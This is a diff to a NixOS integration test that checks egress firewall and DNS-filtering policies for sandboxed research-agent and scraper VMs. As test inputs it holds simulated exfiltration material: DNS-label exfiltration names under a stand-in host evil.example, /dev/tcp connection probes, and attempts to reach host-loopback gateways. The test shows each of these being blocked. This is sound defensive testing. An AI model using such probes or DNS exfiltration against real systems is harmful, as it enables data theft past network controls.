@@ -7,6 +7,17 @@
 #     share) is created via systemd.tmpfiles, owner root mode 700
 #   - /var/lib/research-agent/tool-cache/{prv,bolagsverket} (persistent
 #     jail tool-cache share) created via systemd.tmpfiles, 0777 jonathan
+#   - the guest's egress policy AT RUNTIME (nodes `agent` + `upstream`):
+#     the agent node imports the very module the guest imports
+#     (modules/nixos/research-agent-egress.nix) and resolves through a
+#     fake upstream that serves api.ebay.com's real CNAME-chain shape
+#     onto an "edge" address the test rotates. Asserted: a freshly
+#     rotated address is connectable as soon as the agent resolves it;
+#     an address the resolver never handed out is not, even for an
+#     allowlisted name; an unlisted name (A, AAAA, PTR) is answered
+#     NXDOMAIN by the agent's own resolver and the upstream never sees
+#     the query (no DNS-label exfiltration); no guest process but
+#     dnsmasq can query the upstream directly.
 #
 # Nested-VM gate: starting microvm@research-agent.service would require
 # nested KVM in the outer test QEMU. Some CI / dev hosts don't expose
@@ -90,7 +101,88 @@ pkgs.testers.runNixOSTest {
     systemd.services."microvm-virtiofsd@scraper".wantedBy = lib.mkForce [ ];
   };
 
-  testScript = ''
+  # The research-agent guest's egress policy, run for real. Same module
+  # the guest imports; only the upstream resolver differs (the guest's is
+  # SLIRP's 10.0.2.3). IPv6 off as in the guest.
+  nodes.agent = { nodes, pkgs, ... }: {
+    imports = [ ../modules/nixos/research-agent-egress.nix ];
+    researchAgent.egress.upstreamDns = nodes.upstream.networking.primaryIPAddress;
+    networking.enableIPv6 = false;
+    environment.systemPackages = [ pkgs.curl pkgs.dig ];
+  };
+
+  # The scraper guest's egress policy, run for real: same module the
+  # scraper guest imports, on SLIRP's guest address. The API port is open
+  # inbound as in the guest, with a stub listener.
+  nodes.scraper = { pkgs, ... }: {
+    imports = [ ../modules/nixos/scraper-egress.nix ];
+    networking.enableIPv6 = false;
+    networking.interfaces.eth1.ipv4.addresses = lib.mkAfter [
+      { address = "10.0.2.15"; prefixLength = 24; }
+      { address = "203.0.113.20"; prefixLength = 24; }
+    ];
+    networking.firewall.allowedTCPPorts = [ 8000 ];
+    environment.systemPackages = [ pkgs.curl pkgs.dig ];
+    systemd.services.fake-scraper-api = {
+      wantedBy = [ "multi-user.target" ];
+      script = ''
+        mkdir -p /srv/api && echo api-ok > /srv/api/index.html
+        exec ${pkgs.python3}/bin/python3 -m http.server 8000 --bind 0.0.0.0 --directory /srv/api
+      '';
+    };
+  };
+
+  # Stands in for "the internet": an authoritative-enough resolver plus a
+  # TCP :443 listener on several addresses. api.ebay.com is served with
+  # its real shape — a CNAME chain whose final A record (the Akamai edge)
+  # the test rewrites to simulate rotation. evil.example is not on the
+  # allowlist. Plain HTTP on :443 is enough: the guest rule is
+  # `tcp dport 443`, TLS is irrelevant to the firewall. log-queries is
+  # the witness for "the upstream never saw it".
+  nodes.upstream = { pkgs, ... }: {
+    networking.firewall.enable = false;
+    environment.systemPackages = [ pkgs.dig ];
+    networking.interfaces.eth1.ipv4.addresses = lib.mkAfter ((map
+      (n: { address = "192.168.1.${toString n}"; prefixLength = 24; })
+      [ 10 11 12 13 ])
+      # For node `scraper`: SLIRP's host gateway (= host loopback in prod)
+      # and DNS, plus an address outside every private range standing in
+      # for "a public web server".
+      ++ [
+        { address = "10.0.2.2"; prefixLength = 24; }
+        { address = "10.0.2.3"; prefixLength = 24; }
+        { address = "203.0.113.10"; prefixLength = 24; }
+      ]);
+    services.dnsmasq = {
+      enable = true;
+      resolveLocalQueries = false;
+      settings = {
+        no-resolv = true;
+        no-hosts = true;
+        addn-hosts = "/run/fake-dns/hosts";
+        cname = [
+          "api.ebay.com,global-api.ebaycdn.net"
+          "global-api.ebaycdn.net,ebay-edge.akamaiedge.net"
+        ];
+        local-ttl = 1;
+        log-queries = true;
+      };
+    };
+    systemd.tmpfiles.rules = [ "d /run/fake-dns 0755 root root -" ];
+    systemd.services.dnsmasq.preStart = lib.mkBefore ''
+      printf '192.168.1.10 ebay-edge.akamaiedge.net\n192.168.1.12 evil.example\n' \
+        > /run/fake-dns/hosts
+    '';
+    systemd.services.fake-cdn = {
+      wantedBy = [ "multi-user.target" ];
+      script = ''
+        mkdir -p /srv/cdn && echo ok > /srv/cdn/index.html
+        exec ${pkgs.python3}/bin/python3 -m http.server 443 --bind 0.0.0.0 --directory /srv/cdn
+      '';
+    };
+  };
+
+  testScript = { nodes, ... }: ''
     dellan.wait_for_unit("multi-user.target")
 
     # microvm.nix install-microvm-<name> oneshot exists and runs cleanly.
@@ -187,10 +279,9 @@ pkgs.testers.runNixOSTest {
         f"grep -q '/run/microvm-healthcheck-notify/research-agent' {script_path}"
     )
     # Offline gate: probe failures while the HOST is offline must not
-    # count toward restarts/give-up — the guest self-heals when the
-    # network returns (retry-forever egress-init; contract enforced by
-    # checks.egress-init-retry). Removing this gate regresses to the
-    # 2026-07-07 false "VM DOWN" incident.
+    # count toward restarts/give-up (2026-07-07 false "VM DOWN"
+    # incident). Precautionary since the guest stopped holding sshd
+    # back on DNS; see research-agent-microvm-healthcheck.nix.
     dellan.succeed(f"grep -q 'host is offline' {script_path}")
     dellan.succeed(f"grep -q 'getent ahostsv4' {script_path}")
     # Busy gate: while a research call is dialing the VM the MCP keeps a
@@ -260,6 +351,20 @@ pkgs.testers.runNixOSTest {
     # ---------------------------------------------------------------
     dellan.succeed("systemctl start install-microvm-scraper.service")
     dellan.succeed("test -d /var/lib/microvms/scraper")
+
+    # Every host forward of both VMs binds host loopback, never 0.0.0.0.
+    # QEMU reads `hostfwd=tcp::P-:G` (empty address, microvm.nix's
+    # default) as "all interfaces", which left the scraper API, both
+    # sshds and through them the guests reachable from the LAN with only
+    # the host firewall in the way. Asserted on the runner qemu execs.
+    for vm, fwds in (("research-agent", ["2223-:22"]),
+                     ("scraper", ["2225-:22", "8123-:8000"])):
+        runner = f"/var/lib/microvms/{vm}/current/bin/microvm-run"
+        found = dellan.succeed(f"grep -oE 'hostfwd=tcp:[^,]*' {runner} | sort -u").split()
+        print(f"[diag] {vm} hostfwds: {found}")
+        assert sorted(found) == sorted(f"hostfwd=tcp:127.0.0.1:{f}" for f in fwds), (
+            f"{vm}: expected loopback-only hostfwds for {fwds}, got {found}"
+        )
     dellan.succeed(
         "systemctl cat microvm@scraper.service | grep -q 'Description='"
     )
@@ -348,5 +453,184 @@ pkgs.testers.runNixOSTest {
     assert rc != "failed", (
         f"scraper watchdog must survive corrupted state; got is-failed={rc!r}"
     )
+
+    # ---------------------------------------------------------------
+    # research-agent guest egress, at runtime (nodes agent + upstream).
+    # ---------------------------------------------------------------
+    upstream.start()
+    agent.start()
+    upstream.wait_for_unit("dnsmasq.service")
+    upstream.wait_for_unit("fake-cdn.service")
+    upstream.wait_for_open_port(443)
+    agent.wait_for_unit("multi-user.target")
+    agent.wait_for_unit("dnsmasq.service")
+    agent.wait_for_unit("systemd-resolved.service")
+
+    def set_edge(ip):
+        # Rotate api.ebay.com's final A record, as Akamai does every few
+        # seconds. local-ttl=1 + no caching on the agent side means the
+        # next lookup sees it; sleep past the TTL anyway.
+        upstream.succeed(
+            f"printf '{ip} ebay-edge.akamaiedge.net\\n192.168.1.12 evil.example\\n' "
+            "> /run/fake-dns/hosts && systemctl reload dnsmasq.service"
+        )
+        agent.sleep(2)
+
+    def connect(name, extra=""):
+        # %{remote_ip}: which address the agent actually reached.
+        return agent.succeed(
+            f"curl -sS -m 5 -o /dev/null -w '%{{remote_ip}}' {extra} http://{name}:443/"
+        ).strip()
+
+    def egress_set():
+        return agent.succeed("nft list set inet filter research_allowed")
+
+    # Nothing has been resolved yet, so nothing is allowed yet.
+    print("[diag] set at boot:\n" + egress_set())
+    assert "192.168.1." not in egress_set(), "egress set must start empty"
+
+    # 1. Allowlisted name behind a CNAME chain: reachable, via the edge.
+    ip = connect("api.ebay.com")
+    assert ip == "192.168.1.10", f"expected edge 192.168.1.10, reached {ip!r}"
+
+    # 2. The edge rotates to an address nobody has seen before. The
+    #    boot-time/10-min-refresh design failed exactly here.
+    set_edge("192.168.1.11")
+    ip = connect("api.ebay.com")
+    assert ip == "192.168.1.11", f"rotated edge not reached, got {ip!r}"
+
+    # 3. Rotate again, but connect to the new address WITHOUT asking the
+    #    resolver: allowlisted name or not, an address the resolver never
+    #    handed out stays closed. Then resolve normally: open.
+    set_edge("192.168.1.13")
+    agent.fail(
+        "curl -sS -m 5 -o /dev/null --resolve api.ebay.com:443:192.168.1.13 "
+        "http://api.ebay.com:443/"
+    )
+    ip = connect("api.ebay.com")
+    assert ip == "192.168.1.13", f"edge not opened by resolution, got {ip!r}"
+
+    assert "192.168.1.10" in egress_set(), "resolved edge address must be in the egress set"
+
+    # 4. Unlisted names never leave the guest as DNS. Control first: the
+    #    upstream itself WOULD answer evil.example, so the NXDOMAIN below
+    #    is the agent's resolver refusing to forward, not the upstream.
+    upstream.succeed("dig +short @127.0.0.1 evil.example | grep -qx 192.168.1.12")
+    for name in ["exfil-test.example.com", "c2VjcmV0.evil.example"]:
+        agent.fail(f"getent ahostsv4 {name}")
+        for qtype in ["A", "AAAA"]:
+            status = agent.succeed(
+                f"dig +time=3 +tries=1 @127.0.0.1 {name} {qtype} | grep -o 'status: [A-Z]*'"
+            ).strip()
+            assert status == "status: NXDOMAIN", f"{name} {qtype}: {status!r}"
+    # Reverse lookup of an address /etc/hosts doesn't name (dnsmasq
+    # answers the test nodes' own addresses from /etc/hosts, locally).
+    status = agent.succeed(
+        "dig +time=3 +tries=1 @127.0.0.1 -x 203.0.113.7 | grep -o 'status: [A-Z]*'"
+    ).strip()
+    assert status == "status: NXDOMAIN", f"PTR 203.0.113.7: {status!r}"
+    upstream_log = upstream.succeed("journalctl -u dnsmasq.service --no-pager")
+    # Positive control: the log does record what the agent forwarded.
+    assert "query[A] api.ebay.com from" in upstream_log, "upstream query log not working"
+    for leaked in ["exfil-test", "c2VjcmV0", "7.113.0.203.in-addr.arpa"]:
+        assert leaked not in upstream_log, f"{leaked!r} reached the upstream resolver"
+    # And the firewall still holds for the unlisted name's address even
+    # if the agent already knows it.
+    upstream.succeed("curl -sS -m 5 -o /dev/null http://192.168.1.12:443/")
+    agent.fail(
+        "curl -sS -m 5 -o /dev/null --resolve evil.example:443:192.168.1.12 "
+        "http://evil.example:443/"
+    )
+
+    # 5. Port 53 is open only towards the configured upstream resolver,
+    #    and only for dnsmasq. upstream's dnsmasq listens on every
+    #    address, so .12:53 accepts TCP from an unfiltered node (dellan,
+    #    same vlan) — not from the agent. A root process on the agent
+    #    asking the upstream directly (skipping dnsmasq's name filter)
+    #    gets no answer, even for an allowlisted name.
+    dellan.succeed("timeout 6 bash -c 'exec 3<>/dev/tcp/192.168.1.12/53'")
+    agent.fail("timeout 6 bash -c 'exec 3<>/dev/tcp/192.168.1.12/53'")
+    agent.fail("dig +time=2 +tries=1 @${nodes.upstream.networking.primaryIPAddress} api.ebay.com")
+    agent.fail("dig +tcp +time=2 +tries=1 @${nodes.upstream.networking.primaryIPAddress} api.ebay.com")
+
+    final = egress_set()
+    print("[diag] set after test:\n" + final)
+    assert "192.168.1.12" not in final, "unlisted name's address leaked into the egress set"
+
+    # ---------------------------------------------------------------
+    # scraper guest egress, at runtime (nodes scraper + upstream).
+    # In prod 10.0.2.2 is SLIRP's gateway = the HOST's loopback; any new
+    # connection there let rendered pages reach host-local services.
+    # ---------------------------------------------------------------
+    scraper.start()
+    scraper.wait_for_unit("multi-user.target")
+    scraper.wait_for_unit("fake-scraper-api.service")
+    scraper.wait_for_open_port(8000)
+
+    # Test VMs carry their OWN QEMU SLIRP NIC on eth0, in the same
+    # 10.0.2.0/24 the scraper guest's rules name. Take it down on both
+    # nodes so 10.0.2.x is reached over the test vlan (eth1), where
+    # upstream plays SLIRP's gateway/DNS. Without this the 10.0.2.x checks
+    # below would fail for routing reasons and prove nothing.
+    for m in (scraper, upstream):
+        m.succeed("ip link set eth0 down")
+    scraper.succeed("ip route get 10.0.2.2 | grep -q 'dev eth1'")
+
+    def scraper_get(url):
+        return scraper.execute(f"curl -sS -m 5 -o /dev/null -w '%{{http_code}}' {url}")
+
+    # Positive control first: the same listener on a non-private address
+    # is reachable, so the failures below are the policy, not the network.
+    rc, code = scraper_get("http://203.0.113.10:443/")
+    assert rc == 0 and code == "200", f"public egress broken: rc={rc} code={code!r}"
+
+    # Host gateway and private ranges: refused, whatever the port.
+    for url in ["http://10.0.2.2:443/", "http://10.0.2.2:8123/",
+                "http://192.168.1.10:443/"]:
+        rc, code = scraper_get(url)
+        assert rc != 0, f"scraper reached {url} (code {code!r}) — guest egress must refuse it"
+
+    # SLIRP's DNS port stays reachable (the scraper resolves every URL it
+    # renders) — and only that port: upstream also listens on :443 at
+    # the same address, which must stay refused.
+    scraper.succeed("timeout 6 bash -c 'exec 3<>/dev/tcp/10.0.2.3/53'")
+    scraper.fail("timeout 6 bash -c 'exec 3<>/dev/tcp/10.0.2.3/443'")
+
+    # IPv6. The guest sets enableIPv6 = false, yet live its SLIRP NIC still
+    # carries fec0::/64 from SLIRP's RA (networkd re-enables v6 per link),
+    # and SLIRP maps fec0::2 to the HOST's ::1 exactly as 10.0.2.2 maps to
+    # 127.0.0.1 (measured 2026-10-03: a canary on host [::1] was served to
+    # the guest, and a page WebSocket to ws://[fec0::2] reached it past the
+    # Python request guard). Reproduce that link state here: v6 on eth1
+    # only, SLIRP's v6 gateway played by upstream.
+    upstream.succeed(
+        "sysctl -w net.ipv6.conf.eth1.disable_ipv6=0",
+        "ip -6 addr add fec0::2/64 dev eth1 nodad",
+        "systemd-run --unit=v6-gateway ${pkgs.python3}/bin/python3 -m http.server 8443 --bind fec0::2 --directory /srv/cdn",
+    )
+    scraper.succeed(
+        "sysctl -w net.ipv6.conf.eth1.disable_ipv6=0",
+        "ip -6 addr add fec0::15/64 dev eth1 nodad",
+    )
+    upstream.wait_until_succeeds("ss -ltn | grep -q '\\[fec0::2\\]:8443'")
+    rc, code = scraper_get("-g http://[fec0::2]:8443/")
+    assert rc != 0, f"scraper reached the v6 host gateway (code {code!r}) — guest egress must refuse IPv6"
+
+    # Inbound still works: the host's hostfwd arrives from 10.0.2.2, and
+    # replies on that connection must not be caught by the output drop.
+    out = upstream.succeed("curl -sS -m 5 --interface 10.0.2.2 http://10.0.2.15:8000/")
+    assert out.strip() == "api-ok", f"inbound API via gateway broken: {out!r}"
+
+    counters = scraper.succeed("nft list table inet scraper-egress")
+    print("[diag] scraper-egress:\n" + counters)
+    assert "packets 0 " not in counters, "reject rule never matched — test exercised nothing"
+
+    # Non-vacuity: with the chain emptied, the very same gateway URL is
+    # reachable — so the refusals above were the policy, not the network.
+    scraper.succeed("nft flush chain inet scraper-egress output")
+    rc, code = scraper_get("http://10.0.2.2:443/")
+    assert rc == 0 and code == "200", f"control: gateway unreachable even without policy: rc={rc} code={code!r}"
+    rc, code = scraper_get("-g http://[fec0::2]:8443/")
+    assert rc == 0 and code == "200", f"control: v6 gateway unreachable even without policy: rc={rc} code={code!r}"
   '';
 }
